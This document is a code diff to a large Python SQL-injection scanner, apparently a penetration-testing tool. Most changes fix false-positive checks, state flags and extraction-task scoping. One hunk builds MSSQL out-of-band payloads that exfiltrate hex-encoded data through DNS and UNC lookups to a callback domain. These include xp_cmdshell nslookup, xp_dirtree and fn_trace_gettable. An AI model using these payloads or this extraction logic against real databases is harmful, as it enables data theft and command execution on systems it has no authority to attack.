@@ -107724,7 +107724,8 @@ class TechniqueCascadeEngine:
                         _preconf_direct = (det is not None and
                                            getattr(det, '_fp_guards_preconfirmed', False) and
                                            getattr(det, '_fp_guards_confidence', 0.0) >= 1.0 and
-                                           not getattr(det, '_both_probes_waf_blocked', False))
+                                           not getattr(det, '_both_probes_waf_blocked', False) and
+                                           not getattr(self, '_pcv_check_a_body_identical', False))
                         if _preconf_direct:
                             _wassr_override = True
                             _preconf_conf_d = getattr(det, '_fp_guards_confidence', 0.0)
@@ -108484,6 +108485,10 @@ class TechniqueCascadeEngine:
         # This ensures the extra increment is always undone on all exit paths
         # (normal return, exception, asyncio.CancelledError).
         _pcv_locked_incremented = False
+        # FIX-BODY-IDENTICAL-STALE: Reset the body-identical flag at the start of every
+        # PCV call so stale values from previous calls (different param/technique) cannot
+        # incorrectly veto _preconf_direct when Check A is skipped for the current technique.
+        self._pcv_check_a_body_identical = False
         # BUG-DEAD-TRY-BLOCK FIX: The original code had a dead try/except here with only
         # `pass` statements — the outer try/except was never wired to any finally block that
         # would decrement _PCV_IN_PROGRESS[0] when _pcv_locked_incremented=True.
@@ -108913,7 +108918,7 @@ class TechniqueCascadeEngine:
         # Fix: use a shared 2-element list [blocked_count, total_pairs] in the
         # ENCLOSING scope. Inner function mutates it via index (no assignment), which
         # IS visible to the outer scope without a nonlocal declaration.
-        _check_a_waf_counts = [0, 0]  # [blocked_count, total_pairs]
+        _check_a_waf_counts = [0, 0, 0]  # [blocked_count, total_pairs, zero_gap_non_waf_count]
         async def _run_check_a():
             _substr = "SUBSTRING" if dbms not in ("Oracle", "SQLite") else "SUBSTR"
             # Enhancement #2: Skip derivation for timing detections (invalid SQL)
@@ -109152,6 +109157,8 @@ class TechniqueCascadeEngine:
                 # so the body-size delta check below doesn't accept WAF-page noise as signal.
                 _both_check_a_waf = bool(_t_waf and _f_waf)
                 _gap = abs(_ct_sim - _cf_sim)
+                if not _both_check_a_waf and _gap < 0.001:
+                    _check_a_waf_counts[2] += 1  # zero-gap non-WAF pair: definitive no-injection signal
                 _passed = False
                 if _gap > _gap_threshold * 1.0:
                     _passing_pairs.append((_gap, _name, _gap >= _gap_threshold * 2.0))
@@ -109807,6 +109814,15 @@ class TechniqueCascadeEngine:
             _check_a_waf_counts[1] > 0 and
             _check_a_waf_counts[0] == _check_a_waf_counts[1]
         )
+        # When ALL non-WAF canary pairs returned gap<0.001, this is definitive evidence
+        # that the body does NOT change between true/false conditions — no SQL injection.
+        # _preconf_direct must be vetoed in this case to prevent false positives.
+        _non_waf_pairs = _check_a_waf_counts[1] - _check_a_waf_counts[0]
+        _check_a_all_body_identical = (
+            _non_waf_pairs > 0 and
+            _check_a_waf_counts[2] == _non_waf_pairs
+        )
+        self._pcv_check_a_body_identical = _check_a_all_body_identical
 
         _a_label = "STRONG PASS" if _a_strong else ("PASS" if _a_pass else "FAIL")
         # FIX-BUG2-CHECK-A-LOG: Old code always printed "(3 fallbacks tried)" even when
@@ -129489,8 +129505,13 @@ class ScannerV14(ScannerV13):
                             result = _bg_det
                             _result_already_pcv_verified = True  # BG task PCV already ran
 
-                #  Failsafe: read BG result directly from event object 
-                _result_already_pcv_verified = False
+                #  Failsafe: read BG result directly from event object
+                # FIX-BG-PCV-RESET: Only reset _result_already_pcv_verified when the
+                # failsafe block is entered AND it actually doesn't find a result.
+                # Unconditional reset here discarded the True value set by the BG
+                # confirmation loop above, causing redundant PCV re-runs on already-
+                # verified BG detections (and a potential false-negative when the
+                # re-run fails on a WAF-blocked environment).
                 if not result and _injection_confirmed.is_set():
                     _ev_result = getattr(_injection_confirmed, '_bg_result', None)
                     if _ev_result:
@@ -130248,7 +130269,22 @@ class ScannerV14(ScannerV13):
             # KEY FIX: _extracting_params holds param-only keys (no DBMS suffix).
             # Previously this check used f"{param}:{dbms}" which never matched
             # the param-only keys → deferred path always ran → double extraction.
-            _imm_extracted = getattr(self, '_extracting_params', set())
+            # FIX-EXTRACTING-PARAMS-SCOPE: _extracting_params is set on orch (UniversalScanOrchestrator)
+            # not on self (ScannerV15). Check both self and orch (which IS defined in _v14_cascade
+            # at this point) to get the correct set.
+            _imm_extracted = getattr(self, '_extracting_params', None)
+            if not _imm_extracted:
+                try:
+                    _imm_extracted = getattr(orch, '_extracting_params', set())
+                except NameError:
+                    _imm_extracted = set()
+            if not _imm_extracted:
+                _imm_extracted = set()
+            # Also consider extraction already claimed via module-level flags
+            if not _imm_extracted and (_EXTRACTION_STARTED[0] or _EXTRACTION_ACTIVE[0] or _EXTRACTION_DONE[0]):
+                # Extraction was claimed by V25/_extraction_first path — treat as if params are extracted
+                _ext_claimed_param = _EXTRACTION_STARTED[1] if _EXTRACTION_STARTED[0] else ""
+                _imm_extracted = {_ext_claimed_param.split("@")[0]} if _ext_claimed_param else {"<v25>"}
             _remaining = [
                 e for e in all_confirmed
                 if not e.get("_extracted", False)
@@ -130262,7 +130298,16 @@ class ScannerV14(ScannerV13):
                     # extraction is sufficient to demonstrate SQL injection severity.
                     # Wait for the running task to finish before exiting the scan
                     # (prevents the main coroutine from returning and cancelling it).
+                    # FIX-CURRENT-EXTRACTION-TASK-SCOPE: _current_extraction_task is set on orch,
+                    # not on self. Check both, then fall back to module-level _EXTRACTION_TASK[0].
                     _running_task = getattr(self, '_current_extraction_task', None)
+                    if _running_task is None:
+                        try:
+                            _running_task = getattr(orch, '_current_extraction_task', None)
+                        except NameError:
+                            _running_task = None
+                    if _running_task is None:
+                        _running_task = _EXTRACTION_TASK[0]
                     if _running_task and not _running_task.done():
                         print("[*] Waiting for extraction to complete before exiting...",
                               flush=True)
@@ -130280,7 +130325,13 @@ class ScannerV14(ScannerV13):
                         await self._process_v11(engine, entry, _entry_data, tamper_chain)
 
         # ALWAYS await the extraction task before returning.
+        # FIX-ACTIVE-EXT-SCOPE: _current_extraction_task is on orch, not self; check both.
         _active_ext = getattr(self, '_current_extraction_task', None)
+        if _active_ext is None:
+            try:
+                _active_ext = getattr(orch, '_current_extraction_task', None)
+            except NameError:
+                _active_ext = None
         if _active_ext is None:
             _active_ext = _EXTRACTION_TASK[0] if _EXTRACTION_TASK[0] is not None else None
         if _active_ext and not _active_ext.done():
@@ -130306,7 +130357,15 @@ class ScannerV14(ScannerV13):
             getattr(self, 'session', None) and
             (getattr(self.session, 'data', {}) or {}).get('current_user'))
 
-        if _EXTRACTION_STARTED[0] and not _session_has_data and not _EXTRACTION_ACTUALLY_RAN[0]:
+        # FIX-RECOVERY-STARTED-RESET: _EXTRACTION_STARTED[0] is reset to False by
+        # _extraction_first's finally block before this check runs, so the original
+        # condition `_EXTRACTION_STARTED[0]` was always False here → recovery never fired.
+        # Use _EXTRACTION_TASK[0] is not None as complementary signal: task object is set
+        # when V25 path claims extraction and is never reset during the scan — so if a
+        # task was created but cancelled/failed before _EXTRACTION_ACTUALLY_RAN[0] was set,
+        # we still enter recovery.
+        if ((_EXTRACTION_STARTED[0] or _EXTRACTION_TASK[0] is not None) and
+                not _session_has_data and not _EXTRACTION_ACTUALLY_RAN[0]):
             # BUG-PY313-RECOVERY-CONDITION FIX: Previous conditions required
             # _ext_task_done_or_absent (fails if task is pending/partial after RecursionError)
             # AND all_confirmed non-empty (fails for BG scanner injections where the
@@ -138532,18 +138591,26 @@ class SideChannelExtractor:
                 _ms_fe = f"{self._prefix}DECLARE @h VARCHAR(999);SET @h={_unc_ms};EXEC master..xp_fileexist @h{self._suffix}"
                 _ms_xs = f"{self._prefix}EXEC xp_cmdshell {_q('nslookup ')}+{_hx_ms}+{_q('.' + _cb)}{self._suffix}"
                 _ms_ft = f"{self._prefix}SELECT * FROM fn_trace_gettable({_unc_ms},1){self._suffix}"
+                _methods = [
+                    ("xp_dirtree",       _ms_dt, "xp_dirtree hex-encoded UNC DNS"),
+                    ("xp_fileexist",     _ms_fe, "xp_fileexist hex-encoded UNC DNS"),
+                    ("xp_cmdshell",      _ms_xs, "xp_cmdshell nslookup (stacked only)"),
+                    ("fn_trace_gettable", _ms_ft, "fn_trace_gettable UNC (inline capable)"),
+                ]
             else:
-                # Inline subquery: fn_trace_gettable fires UNC resolution as side-effect
+                # BUG-MSSQL-OOB-NONSTACK-DEDUP FIX: In non-stacked context, DECLARE/EXEC
+                # requires stacked execution so xp_dirtree/xp_fileexist/xp_cmdshell cannot
+                # be used directly.  Only fn_trace_gettable works as an inline subquery.
+                # Previous code set _ms_dt and _ms_ft to identical payloads (both used
+                # AND 1=(SELECT COUNT(*) FROM fn_trace_gettable(...))), wasting one HTTP
+                # request on a duplicate.  _ms_xs was AND 1=1 (a no-op that never triggers
+                # DNS).  Fixed: use only two distinct fn_trace_gettable inline forms.
                 _ms_dt = f"{self._prefix}AND 1=(SELECT COUNT(*) FROM fn_trace_gettable({_unc_ms},1)){self._suffix}"
                 _ms_fe = f"{self._prefix}AND EXISTS(SELECT * FROM fn_trace_gettable({_unc_ms},1)){self._suffix}"
-                _ms_xs = f"{self._prefix}AND 1=1{self._suffix}"  # no inline xp_cmdshell
-                _ms_ft = f"{self._prefix}AND 1=(SELECT COUNT(*) FROM fn_trace_gettable({_unc_ms},1)){self._suffix}"
-            _methods = [
-                ("xp_dirtree",       _ms_dt, "xp_dirtree hex-encoded UNC DNS"),
-                ("xp_fileexist",     _ms_fe, "xp_fileexist hex-encoded UNC DNS"),
-                ("xp_cmdshell",      _ms_xs, "xp_cmdshell nslookup (stacked only)"),
-                ("fn_trace_gettable", _ms_ft, "fn_trace_gettable UNC (inline capable)"),
-            ]
+                _methods = [
+                    ("fn_trace_gettable_count",  _ms_dt, "fn_trace_gettable COUNT inline — UNC DNS trigger"),
+                    ("fn_trace_gettable_exists", _ms_fe, "fn_trace_gettable EXISTS inline — UNC DNS trigger"),
+                ]
         elif self.dbms == "Oracle":
             # BUG-DNS-EXFIL-ORACLE-NONSTACK FIX: For non-stacked (B/E/T detections),
             # self._prefix = "' " so "' SELECT UTL_INADDR..." is invalid SQL.
@@ -142559,7 +142626,11 @@ class ScannerV15(ScannerV14):
             if _c0_caller_owns_active:
                 # Caller holds the lock and owns the slot — run enumeration directly.
                 # Do NOT reset _EXTRACTION_ACTIVE here; the caller's finally block does that.
+                # FIX-EXTRACTION-ACTUALLY-RAN: Must set _EXTRACTION_ACTUALLY_RAN[0]=True here
+                # same as _run_enumeration_with_lock does, so recovery path and session-data
+                # checks correctly reflect that extraction was attempted.
                 try:
+                    _EXTRACTION_ACTUALLY_RAN[0] = True
                     await self._run_enumeration(enum)
                 finally:
                     _EXTRACTION_DONE[0] = True
